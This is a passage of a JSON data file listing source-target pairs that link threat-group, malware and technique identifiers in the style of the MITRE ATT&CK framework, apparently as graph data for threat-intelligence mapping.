            "source": "S0270",
            "target": "T1547.001"
        },
        {
            "source": "S0270",
            "target": "T1218.010"
        },
        {
            "source": "S0270",
            "target": "T1140"
        },
        {
            "source": "S0270",
            "target": "T1113"
        },
        {
            "source": "S0270",
            "target": "T1105"
        },
        {
            "source": "S0270",
            "target": "T1094"
        },
        {
            "source": "S0270",
            "target": "T1082"
        },
        {
            "source": "S0270",
            "target": "T1057"
        },
        {
            "source": "S0270",
            "target": "T1047"
        },
        {
            "source": "S0270",
            "target": "T1033"
        },
        {
            "source": "S0270",
            "target": "T1027"
        },
        {
            "source": "S0270",
            "target": "T1016"
        },
        {
            "source": "G0079",
            "target": "S0270"
        },
        {
            "source": "G0079",
            "target": "S0154"
        },
        {
            "source": "G0079",
            "target": "S0002"
        },
        {
            "source": "S0236",
            "target": "T1069.001"
        },
        {
            "source": "S0236",
            "target": "T1069.002"
        },
        {
            "source": "S0236",
            "target": "T1087.001"
        },
        {
            "source": "S0236",
            "target": "T1021.002"
        },
        {
            "source": "S0236",
            "target": "T1036.004"
        },
        {
            "source": "S0236",
            "target": "T1027.001"
        },
        {
            "source": "S0236",
            "target": "T1218.011"
        },
        {
            "source": "S0236",
            "target": "T1543.003"
        },
        {
            "source": "S0236",
            "target": "T1201"
        },
        {
            "source": "S0236",
            "target": "T1140"
        },
        {
            "source": "S0236",
            "target": "T1135"
        },
        {
            "source": "S0236",
            "target": "T1105"
        },
        {
            "source": "S0236",
            "target": "T1083"
        },
        {
            "source": "S0236",
            "target": "T1082"
        },
        {
            "source": "S0236",
            "target": "T1057"
        },
        {
            "source": "S0236",
            "target": "T1049"
        },
        {
            "source": "S0236",
            "target": "T1033"
        },
        {
            "source": "S0236",
            "target": "T1027"
        },
        {
            "source": "S0236",
            "target": "T1018"
        },
        {
            "source": "S0236",
            "target": "T1016"
        },
        {
            "source": "S0236",
            "target": "T1008"
        },
        {
            "source": "S0236",
            "target": "T1007"
        },
        {
            "source": "G0071",
            "target": "S0236"
        },
        {
            "source": "G0071",
            "target": "S0106"
        },
        {
            "source": "G0071",
            "target": "S0104"
        },
        {
            "source": "S0103",
            "target": "T1016"
        },
        {
            "source": "G0071",
            "target": "S0103"
        },
        {
            "source": "G0071",
            "target": "S0100"
        },
        {
            "source": "S0099",
            "target": "T1016"
        },
        {
            "source": "G0071",
            "target": "S0099"
        },
        {
            "source": "G0071",
            "target": "S0096"
        },
        {
            "source": "G0071",
            "target": "S0039"
        },
        {
            "source": "S0261",
            "target": "T1074.001"
        },
        {
            "source": "S0261",
            "target": "T1056.001"
        },
        {
            "source": "S0261",
            "target": "T1036.004"
        },
        {
            "source": "S0261",
            "target": "T1543.003"
        },
        {
            "source": "S0261",
            "target": "T1115"
        },
        {
            "source": "S0261",
            "target": "T1113"
        },
        {
            "source": "S0261",
            "target": "T1112"
        },
        {
            "source": "S0261",
            "target": "T1016"
        },
        {
            "source": "S0261",
            "target": "T1010"
        },
        {
            "source": "G0076",
            "target": "S0261"
        },
        {
            "source": "G0076",
            "target": "S0029"
        },
        {
            "source": "G0076",
            "target": "S0002"
        },
        {
            "source": "S0197",
            "target": "T1074.001"
        },
        {
            "source": "S0197",
            "target": "T1027"
        },
        {
            "source": "S0197",
            "target": "T1005"
        },
        {
            "source": "G0061",
            "target": "S0197"
        },
        {
            "source": "S0196",
            "target": "T1071.001"
        },
        {
            "source": "S0196",
            "target": "T1074.001"
        },
        {
            "source": "S0196",
            "target": "T1059.006"
        },
        {
            "source": "S0196",
            "target": "T1059.001"
        },
        {
            "source": "S0196",
            "target": "T1518.001"
        },
        {
            "source": "S0196",
            "target": "T1087.001"
        },
        {
            "source": "S0196",
            "target": "T1560.001"
        },
        {
            "source": "S0196",
            "target": "T1036.005"
        },
        {
            "source": "S0196",
            "target": "T1070.004"
        },
        {
            "source": "S0196",
            "target": "T1546.009"
        },
        {
            "source": "S0196",
            "target": "T1547.001"
        },
        {
            "source": "S0196",
            "target": "T1218.011"
        },
        {
            "source": "S0196",
            "target": "T1140"
        },
        {
            "source": "S0196",
            "target": "T1129"
        },
        {
            "source": "S0196",
            "target": "T1105"
        },
        {
            "source": "S0196",
            "target": "T1082"
        },
        {
            "source": "S0196",
            "target": "T1027"
        },
        {
            "source": "G0061",
            "target": "S0196"
        },
        {
            "source": "G0061",
            "target": "S0105"
        },
        {
            "source": "G0061",
            "target": "S0039"
        },
        {
            "source": "S0201",
            "target": "T1071.003"
        },
        {
            "source": "S0201",
            "target": "T1071.002"
        },
        {
            "source": "S0201",
            "target": "T1069.001"
        },
        {
            "source": "S0201",
            "target": "T1059.003"
        },
        {
            "source": "S0201",
            "target": "T1518.001"
        },
        {
            "source": "S0201",
            "target": "T1562.001"
        },
        {
            "source": "S0201",
            "target": "T1056.001"
        },
        {
            "source": "S0201",
            "target": "T1222.001"
        },
        {
            "source": "S0201",
            "target": "T1070.004"
        },
        {
            "source": "S0201",
            "target": "T1197"
        },
        {
            "source": "S0201",
            "target": "T1105"
        },
        {
            "source": "S0201",
            "target": "T1083"
        },
        {
            "source": "S0201",
            "target": "T1082"
        },
        {
            "source": "S0201",
            "target": "T1057"
        },
        {
            "source": "S0201",
            "target": "T1055"
        },
        {
            "source": "S0201",
            "target": "T1033"
        },
        {
            "source": "S0201",
            "target": "T1027"
        },
        {
            "source": "S0201",
            "target": "T1016"
        },
        {
            "source": "S0201",
            "target": "T1012"
        },
        {
            "source": "S0201",
            "target": "T1007"
        },
        {
            "source": "G0068",
            "target": "S0201"
        },
        {
            "source": "S0202",
            "target": "T1573.002"
        },
        {
            "source": "S0202",
            "target": "T1059.003"
        },
        {
            "source": "S0202",
            "target": "T1546.003"
        },
        {
            "source": "G0068",
            "target": "S0202"
        },
        {
            "source": "S0200",
            "target": "T1573.001"
        },
        {
            "source": "S0200",
            "target": "T1071.001"
        },
        {
            "source": "S0200",
            "target": "T1132.001"
        },
        {
            "source": "S0200",
            "target": "T1059.003"
        },
        {
            "source": "S0200",
            "target": "T1547.004"
        },
        {
            "source": "S0200",
            "target": "T1105"
        },
        {
            "source": "S0200",
            "target": "T1094"
        },
        {
            "source": "S0200",
            "target": "T1029"
        },
        {
            "source": "G0068",
            "target": "S0200"
        },
        {
            "source": "S0380",
            "target": "T1059.005"
        },
        {
            "source": "S0380",
            "target": "T1518.001"
        },
        {
            "source": "S0380",
            "target": "T1561.002"
        },
        {
            "source": "S0380",
            "target": "T1561.001"
        },
        {
            "source": "S0380",
            "target": "T1070.004"
        },
        {
            "source": "S0380",
            "target": "T1497"
        },
        {
            "source": "S0380",
            "target": "T1485"
        },
        {
            "source": "S0380",
            "target": "T1124"
        },
        {
            "source": "S0380",
            "target": "T1113"
        },
        {
            "source": "S0380",
            "target": "T1105"
        },
        {
            "source": "S0380",
            "target": "T1082"
        },
        {
            "source": "S0380",
            "target": "T1055"
        },
        {
            "source": "S0380",
            "target": "T1047"
        },
        {
            "source": "S0380",
            "target": "T1027"
        },
        {
            "source": "S0380",
            "target": "T1012"
        },
        {
            "source": "G0064",
            "target": "S0380"
        },
        {
            "source": "S0378",
            "target": "T1071.001"
        },
        {
            "source": "S0378",
            "target": "T1069.001"
        },
        {
            "source": "S0378",
            "target": "T1569.002"
        },
        {
            "source": "S0378",
            "target": "T1087.002"
        },
        {
            "source": "S0378",
            "target": "T1087.001"
        },
        {
            "source": "S0378",
            "target": "T1560.001"
        },
        {
            "source": "S0378",
            "target": "T1134.002"
        },
        {
            "source": "S0378",
            "target": "T1557.001"
        },
        {
            "source": "S0378",
            "target": "T1056.001"
        },
        {
            "source": "S0378",
            "target": "T1003.001"
        },
        {
            "source": "S0378",
            "target": "T1552.001"
        },
        {
            "source": "S0378",
            "target": "T1550.002"
        },
        {
            "source": "S0378",
            "target": "T1548.002"
        },
        {
            "source": "S0378",
            "target": "T1546.003"
        },
        {
            "source": "S0378",
            "target": "T1482"
        },
        {
            "source": "S0378",
            "target": "T1210"
        },
        {
            "source": "S0378",
            "target": "T1201"
        },
        {
            "source": "S0378",
            "target": "T1134"
        },
        {
            "source": "S0378",
            "target": "T1119"
        },
        {
            "source": "S0378",
            "target": "T1110"
        },
        {
            "source": "S0378",
            "target": "T1090"
        },
        {
            "source": "S0378",
            "target": "T1083"
        },
        {
            "source": "S0378",
            "target": "T1082"
        },
        {
            "source": "S0378",
            "target": "T1068"
        },
        {
            "source": "S0378",
            "target": "T1055"
        },
        {
            "source": "S0378",
            "target": "T1049"
        },
        {
            "source": "S0378",
            "target": "T1047"
        },
        {
            "source": "S0378",
            "target": "T1046"
        },
        {
            "source": "S0378",
            "target": "T1040"
        },
        {
            "source": "S0378",
            "target": "T1016"
        },
        {
            "source": "S0378",
            "target": "T1007"
        },
        {
            "source": "G0064",
            "target": "S0378"
        },
        {
            "source": "S0371",
            "target": "T1573.001"
        },
        {
            "source": "S0371",
            "target": "T1071.001"
        },
        {
            "source": "S0371",
            "target": "T1059.001"
        },
        {
            "source": "S0371",
            "target": "T1003.002"
        },
        {
            "source": "S0371",
            "target": "T1546.003"
        },
        {
            "source": "S0371",
            "target": "T1547.001"
        },
        {
            "source": "S0371",
            "target": "T1043"
        },
        {
            "source": "G0064",
            "target": "S0371"
        },
        {
            "source": "G0064",
            "target": "S0363"
        },
        {
            "source": "S0358",
            "target": "T1087.003"
        },
        {
            "source": "S0358",
            "target": "T1137.004"
        },
        {
            "source": "S0358",
            "target": "T1137.003"
        },
        {
            "source": "S0358",
            "target": "T1137.005"
        },
        {
            "source": "G0064",
            "target": "S0358"
        },
        {
            "source": "G0064",
            "target": "S0349"
        },
        {
            "source": "G0064",
            "target": "S0336"
        },
        {
            "source": "G0064",
            "target": "S0194"
        },
        {
            "source": "G0064",
            "target": "S0198"
        },
        {
            "source": "S0199",
            "target": "T1059.003"
        },
        {
            "source": "S0199",
            "target": "T1547.001"
        },
        {
            "source": "S0199",
            "target": "T1055.004"
        },
        {
            "source": "S0199",
            "target": "T1113"
        },
        {
            "source": "S0199",
            "target": "T1105"
        },
        {
            "source": "S0199",
            "target": "T1082"
        },
        {
            "source": "G0064",
            "target": "S0199"
        },
        {
            "source": "S0192",
            "target": "T1573.002"
        },
        {
            "source": "S0192",
            "target": "T1071.001"
        },
        {
            "source": "S0192",
            "target": "T1569.002"
        },
        {
            "source": "S0192",
            "target": "T1059.006"
        },
        {
            "source": "S0192",
            "target": "T1059.001"
        },
        {
            "source": "S0192",
            "target": "T1497.001"
        },
        {
            "source": "S0192",
            "target": "T1087.001"
        },
        {
            "source": "S0192",
            "target": "T1003.004"
        },
        {
            "source": "S0192",
            "target": "T1003.005"
        },
        {
            "source": "S0192",
            "target": "T1560.001"
        },
        {
            "source": "S0192",
            "target": "T1114.001"
        },
        {
            "source": "S0192",
            "target": "T1134.001"
        },
        {
            "source": "S0192",
            "target": "T1555.003"
        },
        {
            "source": "S0192",
            "target": "T1557.001"
        },
        {
            "source": "S0192",
            "target": "T1056.001"
        },
        {
            "source": "S0192",
            "target": "T1555"
        },
        {
            "source": "S0192",
            "target": "T1003.001"
        },
        {
            "source": "S0192",
            "target": "T1021.001"
        },
        {
            "source": "S0192",
            "target": "T1552.001"
        },
        {
            "source": "S0192",
            "target": "T1550.003"
        },
        {
            "source": "S0192",
            "target": "T1548.002"
        },
        {
            "source": "S0192",
            "target": "T1070.001"
        },
        {
            "source": "S0192",
            "target": "T1136.002"
        },
        {
            "source": "S0192",
            "target": "T1136.001"
        },
        {
            "source": "S0192",
            "target": "T1547.001"
        },
        {
            "source": "S0192",
            "target": "T1543.002"
        },
        {
            "source": "S0192",
            "target": "T1055.001"
        },
        {
            "source": "S0192",
            "target": "T1135"
        },
        {
            "source": "S0192",
            "target": "T1125"
        },
        {
            "source": "S0192",
            "target": "T1123"
        },
        {
            "source": "S0192",
            "target": "T1113"
        },
        {
            "source": "S0192",
            "target": "T1105"
        },
        {
            "source": "S0192",
            "target": "T1083"
        },
        {
            "source": "S0192",
            "target": "T1082"
        },
        {
            "source": "S0192",
            "target": "T1057"
        },
        {
            "source": "S0192",
            "target": "T1049"
        },
        {
            "source": "S0192",
            "target": "T1046"
        },
        {
            "source": "S0192",
            "target": "T1041"
        },
        {
            "source": "S0192",
            "target": "T1033"
        },
        {
            "source": "S0192",
            "target": "T1016"
        },
        {
            "source": "G0064",
            "target": "S0192"
        },
        {
            "source": "S0129",
            "target": "T1132.001"
        },
        {
            "source": "S0129",
            "target": "T1059.001"
        },
        {
            "source": "S0129",
            "target": "T1548.002"
        },
        {
            "source": "S0129",
            "target": "T1083"
        },
        {
            "source": "G0064",
            "target": "S0129"
        },
        {
            "source": "G0064",
            "target": "S0095"
        },
        {
            "source": "G0064",
            "target": "S0039"
        },
        {
            "source": "G0064",
            "target": "S0002"
        },
        {
            "source": "S0230",
            "target": "T1573.001"
        },
        {
            "source": "S0230",
            "target": "T1071.001"
        },
        {
            "source": "S0230",
            "target": "T1001.002"
        },
        {
            "source": "S0230",
            "target": "T1574.002"
        },
        {
            "source": "S0230",
            "target": "T1027.002"
        },
        {
            "source": "S0230",
            "target": "T1027.001"
        },
        {
            "source": "S0230",
            "target": "T1548.002"
        },
        {
            "source": "S0230",
            "target": "T1543.003"
        },
        {
            "source": "S0230",
            "target": "T1140"
        },
        {
            "source": "S0230",
            "target": "T1105"
        },
        {
            "source": "S0230",
            "target": "T1082"
        },
        {
            "source": "S0230",
            "target": "T1027"
        },
        {
            "source": "S0230",
            "target": "T1016"
        },
        {
            "source": "G0062",
            "target": "S0230"
        },
        {
            "source": "S0033",
            "target": "T1056.001"
        },
        {
            "source": "S0033",
            "target": "T1010"
        },
        {
            "source": "G0062",
            "target": "S0033"
        },
        {
            "source": "G0062",
            "target": "S0032"
        },
        {
            "source": "G0062",
            "target": "S0013"
        },
        {
            "source": "S0203",
            "target": "T1573.001"
        },
        {
            "source": "S0203",
            "target": "T1569.002"
        },
        {
            "source": "S0203",
            "target": "T1070.004"
        },
        {
            "source": "S0203",
            "target": "T1070.001"
        },
        {
            "source": "S0203",
            "target": "T1543.003"
        },
        {
            "source": "S0203",
            "target": "T1134"
        },
        {
            "source": "S0203",
            "target": "T1129"
        },
        {
            "source": "S0203",
            "target": "T1113"
        },
        {
            "source": "S0203",
            "target": "T1112"
        },
        {
            "source": "S0203",
            "target": "T1105"
        },
        {
            "source": "S0203",
            "target": "T1083"
        },
        {
            "source": "S0203",
            "target": "T1082"
        },
        {
            "source": "S0203",
            "target": "T1057"
        },
        {
            "source": "S0203",
            "target": "T1048"
        },
        {
            "source": "S0203",
            "target": "T1027"
        },
        {
            "source": "S0203",
            "target": "T1016"
        },
        {
            "source": "S0203",
            "target": "T1012"
        },
        {
            "source": "S0203",
            "target": "T1007"
        },
        {
            "source": "S0203",
            "target": "T1005"
        },
        {
            "source": "G0066",
            "target": "S0203"
        },
        {
            "source": "S0211",
            "target": "T1059.003"
        },
        {
            "source": "S0211",
            "target": "T1070.004"
        },
        {
            "source": "S0211",
            "target": "T1105"
        },
        {
            "source": "S0211",
            "target": "T1083"
        },
        {
            "source": "S0211",
            "target": "T1082"
        },
        {
            "source": "S0211",
            "target": "T1057"
        },
        {
            "source": "S0211",
            "target": "T1029"
        },
        {
            "source": "S0211",
            "target": "T1008"
        },
        {
            "source": "S0211",
            "target": "T1005"
        },
        {
            "source": "G0066",
            "target": "S0211"
        },
        {
            "source": "S0205",
            "target": "T1543.003"
        },
        {
            "source": "S0205",
            "target": "T1112"
        },
        {
            "source": "S0205",
            "target": "T1094"
        },
        {
            "source": "S0205",
            "target": "T1082"
        },
        {
            "source": "S0205",
            "target": "T1043"
        },
        {
            "source": "S0205",
            "target": "T1016"
        },
        {
            "source": "G0066",
            "target": "S0205"
        },
        {
            "source": "S0204",
            "target": "T1547.001"
        },
        {
            "source": "S0204",
            "target": "T1218.011"
        },
        {
            "source": "S0204",
            "target": "T1543.003"
        },
        {
            "source": "S0204",
            "target": "T1105"
        },
        {
            "source": "S0204",
            "target": "T1043"
        },
        {
            "source": "G0066",
            "target": "S0204"
        },
        {
            "source": "S0208",
            "target": "T1070.004"
        },
        {
            "source": "S0208",
            "target": "T1547.008"
        },
        {
            "source": "S0208",
            "target": "T1105"
        },
        {
            "source": "S0208",
            "target": "T1083"
        },
        {
            "source": "S0208",
            "target": "T1082"
        },
        {
            "source": "S0208",
            "target": "T1057"
        },
        {
            "source": "S0208",
            "target": "T1043"
        },
        {
            "source": "S0208",
            "target": "T1005"
        },
        {
            "source": "G0066",
            "target": "S0208"
        },
        {
            "source": "S0206",
            "target": "T1059.003"
        },
        {
            "source": "S0206",
            "target": "T1543.003"
        },
        {
            "source": "S0206",
            "target": "T1105"
        },
        {
            "source": "S0206",
            "target": "T1055"
        },
        {
            "source": "S0206",
            "target": "T1043"
        },
        {
            "source": "G0066",
            "target": "S0206"
        },
        {
            "source": "S0210",
            "target": "T1553.002"
        },
        {
            "source": "S0210",
            "target": "T1543.003"
        },
        {
            "source": "S0210",
            "target": "T1112"
        },
        {
            "source": "S0210",
            "target": "T1105"
        },
        {
            "source": "G0066",
            "target": "S0210"
        },
        {
            "source": "S0207",
            "target": "T1071.001"
        },
        {
            "source": "S0207",
            "target": "T1547.001"
        },
        {
            "source": "S0207",
            "target": "T1105"
        },
        {
            "source": "S0207",
            "target": "T1090"
        },
        {
            "source": "G0066",
            "target": "S0207"
        },
        {
            "source": "G0066",
            "target": "S0012"
        },
        {
            "source": "S0594",
            "target": "T1071.001"
        },
        {
            "source": "S0594",
            "target": "T1059.003"
        },
        {
            "source": "S0594",
            "target": "T1114.001"
        },
        {
            "source": "S0594",
            "target": "T1027"
        },
        {
            "source": "S0594",
            "target": "T1005"
        },
        {
            "source": "G0069",
            "target": "S0594"
        },
        {
            "source": "S0592",
            "target": "T1218.007"
        },
        {
            "source": "S0592",
            "target": "T1113"
        },
        {
            "source": "S0592",
            "target": "T1105"
        },
        {
            "source": "S0592",
            "target": "T1083"
        },
        {
            "source": "G0069",
            "target": "S0592"
        },
        {
            "source": "G0069",
            "target": "S0591"
        },
        {
            "source": "G0069",
            "target": "S0488"
        },
        {
            "source": "S0450",
            "target": "T1059.001"
        },
        {
            "source": "S0450",
            "target": "T1124"
        },
        {
            "source": "S0450",
            "target": "T1105"
        },
        {
            "source": "S0450",
            "target": "T1082"
        },
        {
            "source": "S0450",
            "target": "T1033"
        },
        {
            "source": "S0450",
            "target": "T1027"
        },
        {
            "source": "S0450",
            "target": "T1016"
        },
        {
            "source": "G0069",
            "target": "S0450"
        },
        {
            "source": "G0069",
            "target": "S0363"
        },
        {
            "source": "G0069",
            "target": "S0349"
        },
        {
            "source": "G0069",
            "target": "S0250"
        },
        {
            "source": "S0223",
            "target": "T1059.007"
        },
        {
            "source": "S0223",
            "target": "T1573.002"
        },
        {
            "source": "S0223",
            "target": "T1132.001"
        },
        {
            "source": "S0223",
            "target": "T1090.002"
        },
        {
            "source": "S0223",
            "target": "T1059.005"
        },
        {
            "source": "S0223",
            "target": "T1059.001"
        },
        {
            "source": "S0223",
            "target": "T1518.001"
        },
        {
            "source": "S0223",
            "target": "T1087.001"
        },
        {
            "source": "S0223",
            "target": "T1562.001"
        },
        {
            "source": "S0223",
            "target": "T1559.002"
        },
        {
            "source": "S0223",
            "target": "T1559.001"
        },
        {
            "source": "S0223",
            "target": "T1036.004"
        },
        {
            "source": "S0223",
            "target": "T1027.001"
        },
        {
            "source": "S0223",
            "target": "T1070.004"
        },
        {
            "source": "S0223",
            "target": "T1218.005"
        },
        {
            "source": "S0223",
            "target": "T1053.005"
        },
        {
            "source": "S0223",
            "target": "T1140"
        },
        {
            "source": "S0223",
            "target": "T1113"
        },
        {
            "source": "S0223",
            "target": "T1105"
        },
        {
            "source": "S0223",
            "target": "T1082"
        },
        {
            "source": "S0223",
            "target": "T1065"
        },
        {
            "source": "S0223",
            "target": "T1057"
        },
        {
            "source": "S0223",
            "target": "T1047"
        },
        {
            "source": "S0223",
            "target": "T1043"
        },
        {
            "source": "S0223",
            "target": "T1033"
        },
        {
            "source": "S0223",
            "target": "T1029"
        },
        {
            "source": "S0223",
            "target": "T1027"
        },
        {
            "source": "S0223",
            "target": "T1016"
        },
        {
            "source": "S0223",
            "target": "T1005"
        },
        {
            "source": "G0069",
            "target": "S0223"
        },
        {
            "source": "G0069",
            "target": "S0194"
        },
        {
            "source": "G0069",
            "target": "S0002"
        },
        {
            "source": "S0355",
            "target": "T1071.001"
        },
        {
            "source": "S0355",
            "target": "T1547.001"
        },
        {
            "source": "S0355",
            "target": "T1140"
        },
        {
            "source": "S0355",
            "target": "T1082"
        },
        {
            "source": "S0355",
            "target": "T1057"
        },
        {
            "source": "S0355",
            "target": "T1027"
        },
        {
            "source": "G0067",
            "target": "S0355"
        },
        {
            "source": "S0240",
            "target": "T1555.004"
        },
        {
            "source": "S0240",
            "target": "T1071.001"
        },
        {
            "source": "S0240",
            "target": "T1102.002"
        },
        {
            "source": "S0240",
            "target": "T1497.001"
        },
        {
            "source": "S0240",
            "target": "T1518.001"
        },
        {
            "source": "S0240",
            "target": "T1555.003"
        },
        {
            "source": "S0240",
            "target": "T1056.001"
        },
        {
            "source": "S0240",
            "target": "T1070.004"
        },
        {
            "source": "S0240",
            "target": "T1123"
        },
        {
            "source": "S0240",
            "target": "T1113"
        },
        {
            "source": "S0240",
            "target": "T1105"
        },
        {
            "source": "S0240",
            "target": "T1083"
        },
        {
            "source": "S0240",
            "target": "T1082"
        },
        {
            "source": "S0240",
            "target": "T1057"
        },
        {
            "source": "S0240",
            "target": "T1041"
        },
        {
            "source": "S0240",
            "target": "T1012"
        },
        {
            "source": "S0240",
            "target": "T1005"
        },
        {
            "source": "G0067",
            "target": "S0240"
        },
        {
            "source": "S0247",
            "target": "T1071.003"
        },
        {
            "source": "S0247",
            "target": "T1074.001"
        },
        {
            "source": "S0247",
            "target": "T1059.003"
        },
        {
            "source": "S0247",
            "target": "T1056.001"
        },
        {
            "source": "S0247",
            "target": "T1547.001"
        },
        {
            "source": "S0247",
            "target": "T1105"
        },
        {
            "source": "S0247",
            "target": "T1082"
        },
        {
            "source": "S0247",
            "target": "T1057"
        },
        {
            "source": "S0247",
            "target": "T1055"
        },
        {
            "source": "G0067",
            "target": "S0247"
        },
        {
            "source": "S0218",
            "target": "T1102.002"
        },
        {
            "source": "S0218",
            "target": "T1105"
        },
        {
            "source": "S0218",
            "target": "T1082"
        },
        {
            "source": "G0067",
            "target": "S0218"
        },
        {
            "source": "S0212",
            "target": "T1048.003"
        },
        {
            "source": "S0212",
            "target": "T1560.001"
        },
        {
            "source": "S0212",
            "target": "T1083"
        },
        {
            "source": "G0067",
            "target": "S0212"
        },
        {
            "source": "S0213",
            "target": "T1102.002"
        },
        {
            "source": "S0213",
            "target": "T1056.001"
        },
        {
            "source": "S0213",
            "target": "T1123"
        },
        {
            "source": "S0213",
            "target": "T1113"
        },
        {
            "source": "S0213",
            "target": "T1105"
        },
        {
            "source": "S0213",
            "target": "T1027"
        },
        {
            "source": "G0067",
            "target": "S0213"
        },
        {
            "source": "S0215",
            "target": "T1102.002"
        },
        {
            "source": "S0215",
            "target": "T1189"
        },
        {
            "source": "S0215",
            "target": "T1105"
        },
        {
            "source": "S0215",
            "target": "T1082"
        },
        {
            "source": "G0067",
            "target": "S0215"
        },
        {
            "source": "S0216",
            "target": "T1102.002"
        },
        {
            "source": "S0216",
            "target": "T1189"
        },
        {
            "source": "S0216",
            "target": "T1113"
        },
        {
            "source": "S0216",
            "target": "T1083"
        },
        {
            "source": "S0216",
            "target": "T1082"
        },
        {
            "source": "S0216",
            "target": "T1057"
        },
        {
            "source": "G0067",
            "target": "S0216"
        },
        {
            "source": "S0219",
            "target": "T1083"
        },
        {
            "source": "S0219",
            "target": "T1082"
        },
        {
            "source": "S0219",
            "target": "T1059"
        },
        {
            "source": "S0219",
            "target": "T1057"
        },
        {
            "source": "S0219",
            "target": "T1033"
        },
        {
            "source": "S0219",
            "target": "T1010"
        },
        {
            "source": "S0219",
            "target": "T1007"
        },
        {
            "source": "G0067",
            "target": "S0219"
        },
        {
            "source": "S0214",
            "target": "T1105"
        },
        {
            "source": "S0214",
            "target": "T1082"
        },
        {
            "source": "S0214",
            "target": "T1033"
        },
        {
            "source": "G0067",
            "target": "S0214"
        },
        {
            "source": "S0217",
            "target": "T1113"
        },
        {
            "source": "S0217",
            "target": "T1105"
        },
        {
            "source": "S0217",
            "target": "T1082"
        },
        {
            "source": "G0067",
            "target": "S0217"
        },
        {
            "source": "S0233",
            "target": "T1059.003"
        },
        {
            "source": "S0233",
            "target": "T1087.001"
        },
        {
            "source": "S0233",
            "target": "T1070.004"
        },
        {
            "source": "S0233",
            "target": "T1053.002"
        },
        {
            "source": "S0233",
            "target": "T1135"
        },
        {
            "source": "S0233",
            "target": "T1082"
        },
        {
            "source": "S0233",
            "target": "T1069"
        },
        {
            "source": "S0233",
            "target": "T1046"
        },
        {
            "source": "S0233",
            "target": "T1018"
        },
        {
            "source": "G0065",
            "target": "S0233"
        },
        {
            "source": "S0228",
            "target": "T1059.007"
        },
        {
            "source": "S0228",
            "target": "T1071.004"
        },
        {
            "source": "S0228",
            "target": "T1059.005"
        },
        {
            "source": "S0228",
            "target": "T1562.001"
        },
        {
            "source": "S0228",
            "target": "T1070.004"
        },
        {
            "source": "S0228",
            "target": "T1547.001"
        },
        {
            "source": "S0228",
            "target": "T1218.005"
        },
        {
            "source": "S0228",
            "target": "T1105"
        },
        {
            "source": "S0228",
            "target": "T1082"
        },
        {
            "source": "S0228",
            "target": "T1033"
        },
        {
            "source": "S0228",
            "target": "T1027"
        },
        {
            "source": "S0228",
            "target": "T1016"
        },
        {
            "source": "G0065",
            "target": "S0228"
        },
        {
            "source": "S0229",
            "target": "T1102.002"
        },
        {
            "source": "S0229",
            "target": "T1059.003"
        },
        {
            "source": "S0229",
            "target": "T1218.010"
        },
        {
            "source": "S0229",
            "target": "T1055.012"
        },
        {
            "source": "S0229",
            "target": "T1518"
        },
        {
            "source": "S0229",
            "target": "T1105"
        },
        {
            "source": "S0229",
            "target": "T1083"
        },
        {
            "source": "S0229",
            "target": "T1082"
        },
        {
            "source": "S0229",
            "target": "T1070"
        },
        {
            "source": "S0229",
            "target": "T1057"
        },
        {
            "source": "S0229",
            "target": "T1027"
        },
        {
            "source": "S0229",
            "target": "T1016"
        },
        {
            "source": "G0065",
            "target": "S0229"
        },
        {
            "source": "S0232",
            "target": "T1059.003"
        },
        {
            "source": "S0232",
            "target": "T1027"
        },
        {
            "source": "S0232",
            "target": "T1003"
        },
        {
            "source": "G0065",
            "target": "S0232"
        },
        {
            "source": "G0065",
            "target": "S0190"
        },
        {
            "source": "G0065",
            "target": "S0154"
        },
        {
            "source": "G0065",
            "target": "S0110"
        },
        {
            "source": "G0065",
            "target": "S0069"
        },
        {
            "source": "G0065",
            "target": "S0039"
        },
        {
            "source": "G0065",
            "target": "S0021"
        },
        {
            "source": "G0065",
            "target": "S0020"
        },
        {
            "source": "G0065",
            "target": "S0005"
        },
        {
            "source": "S0491",
            "target": "T1573.002"
        },
        {
            "source": "S0491",
            "target": "T1071.001"
        },
        {
            "source": "S0491",
            "target": "T1090.003"
        },
        {
            "source": "S0491",
            "target": "T1571"
        },
        {
            "source": "S0491",
            "target": "T1564.003"
        },
        {
            "source": "S0491",
            "target": "T1204.002"
        },
        {
            "source": "S0491",
            "target": "T1569.002"
        },
        {
            "source": "S0491",
            "target": "T1059.001"
        },
        {
            "source": "S0491",
            "target": "T1518.001"
        },
        {
            "source": "S0491",
            "target": "T1562.001"
        },
        {
            "source": "S0491",
            "target": "T1560.003"
        },
        {
            "source": "S0491",
            "target": "T1036.005"
        },
        {
            "source": "S0491",
            "target": "T1036.004"
        },
        {
            "source": "S0491",
            "target": "T1553.002"
        },
        {
            "source": "S0491",
            "target": "T1070.004"
        },
        {
            "source": "S0491",
            "target": "T1547.001"
        },
        {
            "source": "S0491",
            "target": "T1543.003"
        },
        {
            "source": "S0491",
            "target": "T1119"
        },
        {
            "source": "S0491",
            "target": "T1105"
        },
        {
            "source": "S0491",
            "target": "T1083"
        },
        {
            "source": "S0491",
            "target": "T1082"
        },
        {
            "source": "S0491",
            "target": "T1057"
        },
        {
            "source": "S0491",
            "target": "T1041"
        },
        {
            "source": "S0491",
            "target": "T1027"
        },
        {
            "source": "S0491",
            "target": "T1020"
        },
        {
            "source": "S0491",
            "target": "T1016"
        },
        {
            "source": "G0056",
            "target": "S0491"
        },
        {
            "source": "S0178",
            "target": "T1036.004"
        },
        {
            "source": "S0178",
            "target": "T1547.001"
        },
        {
            "source": "G0056",
            "target": "S0178"
        },
        {
            "source": "S0171",
            "target": "T1573.001"
        },
        {
            "source": "S0171",
            "target": "T1071.001"
        },
        {
            "source": "S0171",
            "target": "T1132.001"
        },
        {
            "source": "S0171",
            "target": "T1059.003"
        },
        {
            "source": "S0171",
            "target": "T1518.001"
        },
        {
            "source": "S0171",
            "target": "T1036.005"
        },
        {
            "source": "S0171",
            "target": "T1105"
        },
        {
            "source": "S0171",
            "target": "T1082"
        },
        {
            "source": "S0171",
            "target": "T1033"
        },
        {
            "source": "S0171",
            "target": "T1016"
        },
        {
            "source": "G0054",
            "target": "S0171"
        },
        {
            "source": "S0188",
            "target": "T1036.005"
        },
        {
            "source": "S0188",
            "target": "T1140"
        },
        {
            "source": "G0054",
            "target": "S0188"
        },
        {
            "source": "G0052",
            "target": "S0363"
        },
        {
            "source": "S0167",
            "target": "T1071.004"
        },
        {
            "source": "S0167",
            "target": "T1056.001"
        },
        {
            "source": "S0167",
            "target": "T1555"
        },
        {
            "source": "S0167",
            "target": "T1547.001"
        },
        {
            "source": "S0167",
            "target": "T1218.011"
        },
        {
            "source": "S0167",
            "target": "T1055.001"
